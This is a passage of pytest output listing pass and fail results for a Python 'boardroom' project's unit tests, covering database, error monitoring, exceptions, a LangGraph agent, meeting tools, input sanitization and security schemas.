tests/unit/test_database_service.py::TestDatabaseServiceCleanup::test_close_disposes_engine PASSED [ 49%]
tests/unit/test_database_service.py::TestDatabaseServiceCleanup::test_close_when_no_engine PASSED [ 49%]
tests/unit/test_database_service.py::TestDatabaseServiceSingleton::test_database_service_singleton_exists PASSED [ 49%]
tests/unit/test_database_service.py::TestDatabaseServiceSingleton::test_database_service_singleton_configuration FAILED [ 50%]
tests/unit/test_database_service.py::TestDatabaseServiceErrorHandling::test_session_error_during_operation FAILED [ 50%]
tests/unit/test_database_service.py::TestDatabaseServiceErrorHandling::test_connection_recovery_after_operational_error FAILED [ 50%]
tests/unit/test_database_service.py::TestDatabaseServiceAsyncOperations::test_concurrent_session_usage PASSED [ 50%]
tests/unit/test_database_service.py::TestDatabaseServiceAsyncOperations::test_async_context_manager_cleanup PASSED [ 50%]
tests/unit/test_database_service.py::TestDatabaseServiceConfigurationVariants::test_debug_mode_configuration FAILED [ 50%]
tests/unit/test_database_service.py::TestDatabaseServiceConfigurationVariants::test_production_mode_configuration FAILED [ 51%]
tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_create_user_with_duplicate_email FAILED [ 51%]
tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_database_transaction_rollback FAILED [ 51%]
tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_connection_pool_exhaustion PASSED [ 51%]
tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_database_connection_timeout FAILED [ 51%]
tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_concurrent_session_management PASSED [ 51%]
tests/unit/test_database_service.py::TestDatabaseServiceLegacyMethods::test_get_session_maker_method FAILED [ 52%]
tests/unit/test_error_monitoring.py::TestErrorMetric::test_error_metric_creation PASSED [ 52%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_error_monitor_initialization PASSED [ 52%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_error_monitor_default_initialization PASSED [ 52%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_record_error_first_occurrence PASSED [ 52%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_record_error_multiple_occurrences PASSED [ 52%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_record_error_window_cleanup PASSED [ 53%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_record_error_alert_threshold PASSED [ 53%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_trigger_alert_output PASSED [ 53%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_alert_rate_limiting PASSED [ 53%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_get_error_summary_recent PASSED [ 53%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_get_error_summary_empty PASSED [ 53%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_get_health_status_healthy PASSED [ 54%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_get_health_status_degraded PASSED [ 54%]
tests/unit/test_error_monitoring.py::TestErrorMonitor::test_get_health_status_unhealthy PASSED [ 54%]
tests/unit/test_error_monitoring.py::TestGlobalErrorMonitor::test_global_error_monitor_exists PASSED [ 54%]
tests/unit/test_error_monitoring.py::TestGlobalErrorMonitor::test_record_error_convenience_function PASSED [ 54%]
tests/unit/test_error_monitoring.py::TestGlobalErrorMonitor::test_get_error_summary_convenience_function PASSED [ 54%]
tests/unit/test_error_monitoring.py::TestGlobalErrorMonitor::test_get_monitoring_health_convenience_function PASSED [ 55%]
tests/unit/test_error_monitoring.py::TestErrorMonitorEdgeCases::test_record_error_without_optional_params PASSED [ 55%]
tests/unit/test_error_monitoring.py::TestErrorMonitorEdgeCases::test_error_metric_path_deduplication PASSED [ 55%]
tests/unit/test_error_monitoring.py::TestErrorMonitorEdgeCases::test_error_metric_status_code_deduplication PASSED [ 55%]
tests/unit/test_error_monitoring.py::TestErrorMonitorEdgeCases::test_window_edge_case_exactly_at_cutoff FAILED [ 55%]
tests/unit/test_error_monitoring.py::TestErrorMonitorEdgeCases::test_multiple_error_types_independence PASSED [ 55%]
tests/unit/test_error_monitoring.py::TestErrorMonitorPerformance::test_large_number_of_errors PASSED [ 56%]
tests/unit/test_error_monitoring.py::TestErrorMonitorPerformance::test_memory_usage_with_window_cleanup PASSED [ 56%]
tests/unit/test_exceptions.py::TestBoardroomException::test_boardroom_exception_basic FAILED [ 56%]
tests/unit/test_exceptions.py::TestBoardroomException::test_boardroom_exception_with_all_params PASSED [ 56%]
tests/unit/test_exceptions.py::TestBoardroomException::test_boardroom_exception_to_dict PASSED [ 56%]
tests/unit/test_exceptions.py::TestBoardroomException::test_boardroom_exception_details_default PASSED [ 56%]
tests/unit/test_exceptions.py::TestValidationException::test_validation_exception_basic PASSED [ 57%]
tests/unit/test_exceptions.py::TestValidationException::test_validation_exception_with_field PASSED [ 57%]
tests/unit/test_exceptions.py::TestValidationException::test_validation_exception_with_details PASSED [ 57%]
tests/unit/test_exceptions.py::TestAuthenticationException::test_authentication_exception_default PASSED [ 57%]
tests/unit/test_exceptions.py::TestAuthenticationException::test_authentication_exception_custom_message PASSED [ 57%]
tests/unit/test_exceptions.py::TestAuthenticationException::test_authentication_exception_with_details PASSED [ 57%]
tests/unit/test_exceptions.py::TestAuthorizationException::test_authorization_exception_default PASSED [ 58%]
tests/unit/test_exceptions.py::TestAuthorizationException::test_authorization_exception_custom_message PASSED [ 58%]
tests/unit/test_exceptions.py::TestResourceNotFoundException::test_resource_not_found_basic PASSED [ 58%]
tests/unit/test_exceptions.py::TestResourceNotFoundException::test_resource_not_found_with_id PASSED [ 58%]
tests/unit/test_exceptions.py::TestResourceNotFoundException::test_resource_not_found_with_details PASSED [ 58%]
tests/unit/test_exceptions.py::TestConflictException::test_conflict_exception_basic PASSED [ 58%]
tests/unit/test_exceptions.py::TestConflictException::test_conflict_exception_with_resource PASSED [ 59%]
tests/unit/test_exceptions.py::TestDatabaseException::test_database_exception_default PASSED [ 59%]
tests/unit/test_exceptions.py::TestDatabaseException::test_database_exception_custom_message PASSED [ 59%]
tests/unit/test_exceptions.py::TestExternalServiceException::test_external_service_exception_basic PASSED [ 59%]
tests/unit/test_exceptions.py::TestExternalServiceException::test_external_service_exception_custom_message PASSED [ 59%]
tests/unit/test_exceptions.py::TestExternalServiceException::test_external_service_exception_with_details PASSED [ 59%]
tests/unit/test_exceptions.py::TestRateLimitException::test_rate_limit_exception_default PASSED [ 60%]
tests/unit/test_exceptions.py::TestRateLimitException::test_rate_limit_exception_custom_message PASSED [ 60%]
tests/unit/test_exceptions.py::TestBusinessLogicException::test_business_logic_exception_basic PASSED [ 60%]
tests/unit/test_exceptions.py::TestBusinessLogicException::test_business_logic_exception_with_rule PASSED [ 60%]
tests/unit/test_exceptions.py::TestConfigurationException::test_configuration_exception_basic PASSED [ 60%]
tests/unit/test_exceptions.py::TestConfigurationException::test_configuration_exception_with_key PASSED [ 60%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_not_found_basic PASSED [ 61%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_not_found_with_id PASSED [ 61%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_validation_error_basic PASSED [ 61%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_validation_error_with_field PASSED [ 61%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_auth_error_default PASSED [ 61%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_auth_error_custom PASSED [ 61%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_permission_error_default PASSED [ 62%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_permission_error_custom PASSED [ 62%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_conflict_error_basic PASSED [ 62%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_conflict_error_with_resource PASSED [ 62%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_database_error_default PASSED [ 62%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_database_error_custom PASSED [ 63%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_business_logic_error_basic PASSED [ 63%]
tests/unit/test_exceptions.py::TestUtilityFunctions::test_raise_business_logic_error_with_rule PASSED [ 63%]
tests/unit/test_exceptions.py::TestExceptionInheritance::test_all_exceptions_inherit_from_boardroom_exception PASSED [ 63%]
tests/unit/test_exceptions.py::TestExceptionInheritance::test_all_exceptions_inherit_from_base_exception PASSED [ 63%]
tests/unit/test_exceptions.py::TestExceptionSerialization::test_exception_to_dict_structure PASSED [ 63%]
tests/unit/test_exceptions.py::TestExceptionSerialization::test_exception_json_serializable PASSED [ 64%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_agent_initialization PASSED [ 64%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_model_kwargs_development FAILED [ 64%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_model_kwargs_production FAILED [ 64%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_connection_pool_success PASSED [ 64%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_connection_pool_failure_production PASSED [ 64%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_success FAILED [ 65%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_with_token_usage FAILED [ 65%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_llm_error_retry FAILED [ 65%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_max_retries_exceeded FAILED [ 65%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_tool_call_success PASSED [ 65%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_tool_call_no_tools PASSED [ 65%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_tool_call_tool_not_found FAILED [ 66%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_tool_call_execution_error PASSED [ 66%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_should_continue_no_tool_calls PASSED [ 66%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_should_continue_with_tool_calls PASSED [ 66%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_create_graph_success FAILED [ 66%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_create_graph_no_checkpointer FAILED [ 66%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_response_success FAILED [ 67%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_stream_response FAILED [ 67%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_chat_history FAILED [ 67%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_clear_chat_history FAILED [ 67%]
tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_process_messages PASSED [ 67%]
tests/unit/test_langgraph_graph.py::TestAIOperationMetrics::test_metrics_initialization PASSED [ 67%]
tests/unit/test_langgraph_graph.py::TestAIOperationMetrics::test_metrics_completion_success PASSED [ 68%]
tests/unit/test_langgraph_graph.py::TestAIOperationMetrics::test_metrics_completion_failure PASSED [ 68%]
tests/unit/test_langgraph_graph.py::TestTokenUsage::test_token_usage_calculation PASSED [ 68%]
tests/unit/test_langgraph_graph.py::TestTokenUsage::test_token_usage_zero_values PASSED [ 68%]
tests/unit/test_meeting_management_tools.py::TestCreateMeetingAgendaTool::test_tool_metadata PASSED [ 68%]
tests/unit/test_meeting_management_tools.py::TestCreateMeetingAgendaTool::test_create_basic_agenda PASSED [ 68%]
tests/unit/test_meeting_management_tools.py::TestCreateMeetingAgendaTool::test_create_agenda_with_additional_items PASSED [ 69%]
tests/unit/test_meeting_management_tools.py::TestCreateMeetingAgendaTool::test_time_allocation_calculation FAILED [ 69%]
tests/unit/test_meeting_management_tools.py::TestCreateMeetingAgendaTool::test_async_execution PASSED [ 69%]
tests/unit/test_meeting_management_tools.py::TestCreateMeetingAgendaTool::test_tool_execution_error_handling PASSED [ 69%]
tests/unit/test_meeting_management_tools.py::TestDecisionSupportTool::test_tool_metadata PASSED [ 69%]
tests/unit/test_meeting_management_tools.py::TestDecisionSupportTool::test_analyze_decision_with_criteria PASSED [ 69%]
tests/unit/test_meeting_management_tools.py::TestDecisionSupportTool::test_analyze_decision_default_criteria PASSED [ 70%]
tests/unit/test_meeting_management_tools.py::TestDecisionSupportTool::test_scoring_consistency PASSED [ 70%]
tests/unit/test_meeting_management_tools.py::TestDecisionSupportTool::test_async_execution PASSED [ 70%]
tests/unit/test_meeting_management_tools.py::TestGenerateMeetingMinutesTool::test_tool_metadata PASSED [ 70%]
tests/unit/test_meeting_management_tools.py::TestGenerateMeetingMinutesTool::test_generate_minutes_basic PASSED [ 70%]
tests/unit/test_meeting_management_tools.py::TestGenerateMeetingMinutesTool::test_action_items_structure PASSED [ 70%]
tests/unit/test_meeting_management_tools.py::TestGenerateMeetingMinutesTool::test_empty_lists_handling PASSED [ 71%]
tests/unit/test_meeting_management_tools.py::TestGenerateMeetingMinutesTool::test_async_execution PASSED [ 71%]
tests/unit/test_meeting_management_tools.py::TestGenerateMeetingMinutesTool::test_date_formatting PASSED [ 71%]
tests/unit/test_meeting_management_tools.py::TestToolInstances::test_tool_instances_exist PASSED [ 71%]
tests/unit/test_meeting_management_tools.py::TestToolInstances::test_tool_names_unique PASSED [ 71%]
tests/unit/test_meeting_management_tools.py::TestInputSchemas::test_meeting_agenda_input_validation PASSED [ 71%]
tests/unit/test_meeting_management_tools.py::TestInputSchemas::test_decision_support_input_validation PASSED [ 72%]
tests/unit/test_meeting_management_tools.py::TestInputSchemas::test_meeting_minutes_input_validation PASSED [ 72%]
tests/unit/test_sanitization.py::TestSanitizeString::test_sanitize_string_basic PASSED [ 72%]
tests/unit/test_sanitization.py::TestSanitizeString::test_sanitize_string_html_escape FAILED [ 72%]
tests/unit/test_sanitization.py::TestSanitizeString::test_sanitize_string_remove_script_tags PASSED [ 72%]
tests/unit/test_sanitization.py::TestSanitizeString::test_sanitize_string_remove_null_bytes FAILED [ 72%]
tests/unit/test_sanitization.py::TestSanitizeString::test_sanitize_string_non_string_input PASSED [ 73%]
tests/unit/test_sanitization.py::TestSanitizeString::test_sanitize_string_complex_html PASSED [ 73%]
tests/unit/test_sanitization.py::TestSanitizeEmail::test_sanitize_email_valid PASSED [ 73%]
tests/unit/test_sanitization.py::TestSanitizeEmail::test_sanitize_email_uppercase PASSED [ 73%]
tests/unit/test_sanitization.py::TestSanitizeEmail::test_sanitize_email_invalid_format FAILED [ 73%]
tests/unit/test_sanitization.py::TestSanitizeEmail::test_sanitize_email_with_html PASSED [ 73%]
tests/unit/test_sanitization.py::TestSanitizeEmail::test_sanitize_email_malicious_input PASSED [ 74%]
tests/unit/test_sanitization.py::TestSanitizeDict::test_sanitize_dict_simple PASSED [ 74%]
tests/unit/test_sanitization.py::TestSanitizeDict::test_sanitize_dict_nested FAILED [ 74%]
tests/unit/test_sanitization.py::TestSanitizeDict::test_sanitize_dict_with_lists PASSED [ 74%]
tests/unit/test_sanitization.py::TestSanitizeList::test_sanitize_list_simple PASSED [ 74%]
tests/unit/test_sanitization.py::TestSanitizeList::test_sanitize_list_with_html FAILED [ 75%]
tests/unit/test_sanitization.py::TestSanitizeList::test_sanitize_list_nested PASSED [ 75%]
tests/unit/test_sanitization.py::TestValidatePasswordStrength::test_validate_password_strength_valid PASSED [ 75%]
tests/unit/test_sanitization.py::TestValidatePasswordStrength::test_validate_password_strength_too_short PASSED [ 75%]
tests/unit/test_sanitization.py::TestValidatePasswordStrength::test_validate_password_strength_no_uppercase PASSED [ 75%]
tests/unit/test_sanitization.py::TestValidatePasswordStrength::test_validate_password_strength_no_lowercase PASSED [ 75%]
tests/unit/test_sanitization.py::TestValidatePasswordStrength::test_validate_password_strength_no_number PASSED [ 76%]
tests/unit/test_sanitization.py::TestValidatePasswordStrength::test_validate_password_strength_no_special PASSED [ 76%]
tests/unit/test_sanitization.py::TestSanitizeFilename::test_sanitize_filename_normal PASSED [ 76%]
tests/unit/test_sanitization.py::TestSanitizeFilename::test_sanitize_filename_dangerous_chars PASSED [ 76%]
tests/unit/test_sanitization.py::TestSanitizeFilename::test_sanitize_filename_path_traversal FAILED [ 76%]
tests/unit/test_sanitization.py::TestSanitizeFilename::test_sanitize_filename_null_bytes PASSED [ 76%]
tests/unit/test_sanitization.py::TestSanitizeFilename::test_sanitize_filename_too_long PASSED [ 77%]
tests/unit/test_sanitization.py::TestSanitizeSqlLikePattern::test_sanitize_sql_like_pattern_normal FAILED [ 77%]
tests/unit/test_sanitization.py::TestSanitizeSqlLikePattern::test_sanitize_sql_like_pattern_special_chars PASSED [ 77%]
tests/unit/test_sanitization.py::TestSanitizeSqlLikePattern::test_sanitize_sql_like_pattern_backslash PASSED [ 77%]
tests/unit/test_sanitization.py::TestValidateUuidString::test_validate_uuid_string_valid PASSED [ 77%]
tests/unit/test_sanitization.py::TestValidateUuidString::test_validate_uuid_string_invalid PASSED [ 77%]
tests/unit/test_sanitization.py::TestSanitizeJsonData::test_sanitize_json_data_simple FAILED [ 78%]
tests/unit/test_sanitization.py::TestSanitizeJsonData::test_sanitize_json_data_nested PASSED [ 78%]
tests/unit/test_sanitization.py::TestSanitizeJsonData::test_sanitize_json_data_max_depth PASSED [ 78%]
tests/unit/test_sanitization.py::TestSanitizeJsonData::test_sanitize_json_data_large_dict PASSED [ 78%]
tests/unit/test_sanitization.py::TestSanitizeJsonData::test_sanitize_json_data_large_list PASSED [ 78%]
tests/unit/test_sanitization.py::TestValidateIpAddress::test_validate_ip_address_ipv4 PASSED [ 78%]
tests/unit/test_sanitization.py::TestValidateIpAddress::test_validate_ip_address_ipv6 PASSED [ 79%]
tests/unit/test_sanitization.py::TestValidateIpAddress::test_validate_ip_address_invalid PASSED [ 79%]
tests/unit/test_sanitization.py::TestSanitizeUrl::test_sanitize_url_valid PASSED [ 79%]
tests/unit/test_sanitization.py::TestSanitizeUrl::test_sanitize_url_dangerous_schemes FAILED [ 79%]
tests/unit/test_sanitization.py::TestSanitizeUrl::test_sanitize_url_invalid_scheme PASSED [ 79%]
tests/unit/test_sanitization.py::TestSanitizeUrl::test_sanitize_url_malformed FAILED [ 79%]
tests/unit/test_sanitization.py::TestValidateContentType::test_validate_content_type_valid PASSED [ 80%]
tests/unit/test_sanitization.py::TestValidateContentType::test_validate_content_type_with_parameters PASSED [ 80%]
tests/unit/test_sanitization.py::TestValidateContentType::test_validate_content_type_invalid PASSED [ 80%]
tests/unit/test_sanitization.py::TestSanitizeHeaderValue::test_sanitize_header_value_normal PASSED [ 80%]
tests/unit/test_sanitization.py::TestSanitizeHeaderValue::test_sanitize_header_value_remove_newlines PASSED [ 80%]
tests/unit/test_sanitization.py::TestSanitizeHeaderValue::test_sanitize_header_value_remove_null_bytes PASSED [ 80%]
tests/unit/test_sanitization.py::TestSanitizeHeaderValue::test_sanitize_header_value_length_limit PASSED [ 81%]
tests/unit/test_sanitization.py::TestSanitizationIntegration::test_comprehensive_sanitization FAILED [ 81%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_advanced_xss_attempts FAILED [ 81%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_sql_injection_attempts FAILED [ 81%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_command_injection_attempts FAILED [ 81%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_unicode_bypass_attempts FAILED [ 81%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_null_byte_variations PASSED [ 82%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_empty_and_whitespace FAILED [ 82%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_email_advanced_validation PASSED [ 82%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_email_internationalized_domains PASSED [ 82%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_dict_deep_nesting_attack FAILED [ 82%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_list_large_list_attack FAILED [ 82%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_filename_path_traversal_variants FAILED [ 83%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_filename_reserved_names PASSED [ 83%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_validate_password_strength_comprehensive FAILED [ 83%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_sql_like_pattern_comprehensive PASSED [ 83%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_validate_uuid_string_format_variations FAILED [ 83%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_json_data_attack_vectors FAILED [ 83%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_validate_ip_address_edge_cases PASSED [ 84%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_url_comprehensive_attacks FAILED [ 84%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_validate_content_type_edge_cases PASSED [ 84%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_header_value_injection_attacks PASSED [ 84%]
tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitization_performance_with_large_data FAILED [ 84%]
tests/unit/test_sanitization.py::TestSanitizationSecurityBoundaries::test_maximum_input_sizes PASSED [ 84%]
tests/unit/test_sanitization.py::TestSanitizationSecurityBoundaries::test_sanitization_consistency PASSED [ 85%]
tests/unit/test_sanitization.py::TestSanitizationSecurityBoundaries::test_sanitization_immutability PASSED [ 85%]
tests/unit/test_sanitization.py::TestSanitizationSecurityBoundaries::test_sanitization_encoding_preservation FAILED [ 85%]
tests/unit/test_security_schemas.py::TestSecurityLevel::test_security_level_values PASSED [ 85%]
tests/unit/test_security_schemas.py::TestSecurityLevel::test_security_level_comparison PASSED [ 85%]
tests/unit/test_security_schemas.py::TestSecretType::test_secret_type_values PASSED [ 85%]
tests/unit/test_security_schemas.py::TestSecretType::test_secret_type_usage PASSED [ 86%]
tests/unit/test_security_schemas.py::TestRotationPolicy::test_rotation_policy_default_values PASSED [ 86%]
tests/unit/test_security_schemas.py::TestRotationPolicy::test_rotation_policy_custom_values PASSED [ 86%]
tests/unit/test_security_schemas.py::TestRotationPolicy::test_rotation_policy_validation_warning_days PASSED [ 86%]
tests/unit/test_security_schemas.py::TestRotationPolicy::test_rotation_policy_edge_cases FAILED [ 86%]
tests/unit/test_security_schemas.py::TestRotationPolicy::test_rotation_policy_invalid_ranges PASSED [ 86%]
tests/unit/test_security_schemas.py::TestEncryptionConfig::test_encryption_config_defaults PASSED [ 87%]
tests/unit/test_security_schemas.py::TestEncryptionConfig::test_encryption_config_custom_values PASSED [ 87%]
tests/unit/test_security_schemas.py::TestEncryptionConfig::test_encryption_config_validation PASSED [ 87%]
tests/unit/test_security_schemas.py::TestSecretMetadata::test_secret_metadata_defaults PASSED [ 87%]
tests/unit/test_security_schemas.py::TestSecretMetadata::test_secret_metadata_custom_values PASSED [ 87%]
tests/unit/test_security_schemas.py::TestSecretMetadata::test_secret_metadata_id_generation PASSED [ 88%]
tests/unit/test_security_schemas.py::TestSecretValue::test_secret_value_creation PASSED [ 88%]
tests/unit/test_security_schemas.py::TestSecretValue::test_secret_value_required_fields PASSED [ 88%]
tests/unit/test_security_schemas.py::TestStoredSecret::test_stored_secret_creation PASSED [ 88%]
tests/unit/test_security_schemas.py::TestStoredSecret::test_stored_secret_with_backup_info PASSED [ 88%]
tests/unit/test_security_schemas.py::TestSecurityViolation::test_security_violation_defaults PASSED [ 88%]
tests/unit/test_security_schemas.py::TestSecurityViolation::test_security_violation_with_details PASSED [ 89%]
tests/unit/test_security_schemas.py::TestSecurityViolation::test_security_violation_id_generation PASSED [ 89%]
tests/unit/test_security_schemas.py::TestSecurityPolicy::test_security_policy_defaults PASSED [ 89%]
tests/unit/test_security_schemas.py::TestSecurityPolicy::test_security_policy_with_rules PASSED [ 89%]
tests/unit/test_security_schemas.py::TestSecurityScanResult::test_security_scan_result_defaults PASSED [ 89%]
tests/unit/test_security_schemas.py::TestSecurityScanResult::test_security_scan_result_with_violations PASSED [ 89%]
tests/unit/test_security_schemas.py::TestSecurityScanResult::test_security_scan_result_id_generation PASSED [ 90%]
tests/unit/test_security_schemas.py::TestAuditEvent::test_audit_event_defaults PASSED [ 90%]
tests/unit/test_security_schemas.py::TestAuditEvent::test_audit_event_with_details PASSED [ 90%]
tests/unit/test_security_schemas.py::TestAuditEvent::test_audit_event_id_generation PASSED [ 90%]
tests/unit/test_security_schemas.py::TestSecurityConfiguration::test_security_configuration_defaults PASSED [ 90%]
tests/unit/test_security_schemas.py::TestSecurityConfiguration::test_security_configuration_with_policies PASSED [ 90%]
tests/unit/test_security_schemas.py::TestSecurityConfiguration::test_security_configuration_validation PASSED [ 91%]
tests/unit/test_security_schemas.py::TestSecretRequest::test_secret_request_required_fields PASSED [ 91%]
tests/unit/test_security_schemas.py::TestSecretRequest::test_secret_request_with_optional_fields PASSED [ 91%]
tests/unit/test_security_schemas.py::TestSecretRequest::test_secret_request_validation PASSED [ 91%]
tests/unit/test_security_schemas.py::TestSecretResponse::test_secret_response_creation PASSED [ 91%]
tests/unit/test_security_schemas.py::TestSecretResponse::test_secret_response_optional_fields PASSED [ 91%]
tests/unit/test_security_schemas.py::TestHealthCheck::test_health_check_defaults PASSED [ 92%]
tests/unit/test_security_schemas.py::TestHealthCheck::test_health_check_with_issues PASSED [ 92%]
tests/unit/test_security_schemas.py::TestDefaultSecurityPolicies::test_default_policies_exist PASSED [ 92%]
tests/unit/test_security_schemas.py::TestDefaultSecurityPolicies::test_default_policies_structure PASSED [ 92%]
tests/unit/test_security_schemas.py::TestDefaultSecurityPolicies::test_no_hardcoded_secrets_policy PASSED [ 92%]
tests/unit/test_security_schemas.py::TestDefaultSecurityPolicies::test_encryption_standards_policy PASSED [ 92%]
tests/unit/test_security_schemas.py::TestDefaultSecurityPolicies::test_secure_protocols_policy PASSED [ 93%]
tests/unit/test_security_schemas.py::TestDefaultSecurityPolicies::test_configuration_security_policy PASSED [ 93%]
tests/unit/test_security_schemas.py::TestSecuritySchemaIntegration::test_complete_secret_lifecycle PASSED [ 93%]
tests/unit/test_security_schemas.py::TestSecuritySchemaIntegration::test_security_violation_to_audit_event PASSED [ 93%]
tests/unit/test_security_schemas.py::TestSecuritySchemaIntegration::test_comprehensive_security_configuration PASSED [ 93%]
tests/unit/test_security_schemas.py::TestSecuritySchemasEdgeCases::test_malformed_security_data PASSED [ 93%]
tests/unit/test_security_schemas.py::TestSecuritySchemasEdgeCases::test_security_token_generation_failure PASSED [ 94%]
tests/unit/test_security_schemas.py::TestSecuritySchemasEdgeCases::test_datetime_edge_cases PASSED [ 94%]
tests/unit/test_security_schemas.py::TestSecuritySchemasEdgeCases::test_large_data_structures PASSED [ 94%]
tests/unit/test_security_schemas.py::TestSecuritySchemasEdgeCases::test_unicode_and_special_characters PASSED [ 94%]
tests/unit/test_workflow.py::TestCallLLM::test_call_llm_success PASSED   [ 94%]
tests/unit/test_workflow.py::TestCallLLM::test_call_llm_default_temperature PASSED [ 94%]
tests/unit/test_workflow.py::TestCallLLM::test_call_llm_retry_logic PASSED [ 95%]
tests/unit/test_workflow.py::TestCallLLM::test_call_llm_max_retries_exceeded PASSED [ 95%]
tests/unit/test_workflow.py::TestCallLLM::test_call_llm_http_error PASSED [ 95%]
tests/unit/test_workflow.py::TestCallLLM::test_call_llm_missing_env_vars PASSED [ 95%]
tests/unit/test_workflow.py::TestCallLLM::test_call_llm_malformed_response PASSED [ 95%]
tests/unit/test_workflow.py::TestCallLLM::test_call_llm_json_decode_error PASSED [ 95%]
tests/unit/test_workflow.py::TestRunBoardroomWorkflow::test_run_boardroom_workflow_success PASSED [ 96%]
tests/unit/test_workflow.py::TestRunBoardroomWorkflow::test_run_boardroom_workflow_missing_decision_id PASSED [ 96%]
tests/unit/test_workflow.py::TestRunBoardroomWorkflow::test_run_boardroom_workflow_missing_status PASSED [ 96%]
tests/unit/test_workflow.py::TestRunBoardroomWorkflow::test_run_boardroom_workflow_state_creation_error PASSED [ 96%]
tests/unit/test_workflow.py::TestRunBoardroomWorkflow::test_run_boardroom_workflow_execution_error PASSED [ 96%]
tests/unit/test_workflow.py::TestRunBoardroomWorkflow::test_run_boardroom_workflow_with_extra_fields PASSED [ 96%]
tests/unit/test_workflow.py::TestRunBoardroomWorkflow::test_run_boardroom_workflow_complex_state PASSED [ 97%]
tests/unit/test_workflow.py::TestWorkflowModule::test_workflow_initialization FAILED [ 97%]
tests/unit/test_workflow.py::TestWorkflowModule::test_workflow_exists PASSED [ 97%]
tests/unit/test_workflow.py::TestWorkflowStateTransitions::test_pending_to_voting_transition PASSED [ 97%]
tests/unit/test_workflow.py::TestWorkflowStateTransitions::test_voting_to_completed_transition PASSED [ 97%]
tests/unit/test_workflow.py::TestWorkflowStateTransitions::test_voting_to_expired_transition PASSED [ 97%]
tests/unit/test_workflow.py::TestWorkflowBusinessRules::test_quorum_validation PASSED [ 98%]
tests/unit/test_workflow.py::TestWorkflowBusinessRules::test_deadline_validation PASSED [ 98%]
tests/unit/test_workflow.py::TestWorkflowBusinessRules::test_permission_validation PASSED [ 98%]
tests/unit/test_workflow.py::TestWorkflowErrorHandling::test_network_error_handling PASSED [ 98%]
tests/unit/test_workflow.py::TestWorkflowErrorHandling::test_timeout_error_handling PASSED [ 98%]
